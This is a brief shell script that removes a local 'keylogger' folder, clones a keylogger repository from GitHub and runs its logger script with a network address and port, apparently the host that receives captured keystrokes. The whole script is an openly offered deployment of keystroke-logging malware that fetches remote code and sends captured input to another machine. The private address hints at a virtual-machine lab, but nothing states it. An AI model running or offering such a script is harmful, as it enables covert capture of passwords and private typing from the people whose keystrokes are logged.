#CWD="$(cd -P -- "$(dirname -- "$0")" && pwd -P)"
rm -rf keylogger;
git clone https://github.com/mgild/keylogger.git;
cd keylogger;
zsh logger.sh 10.0.2.15:8000
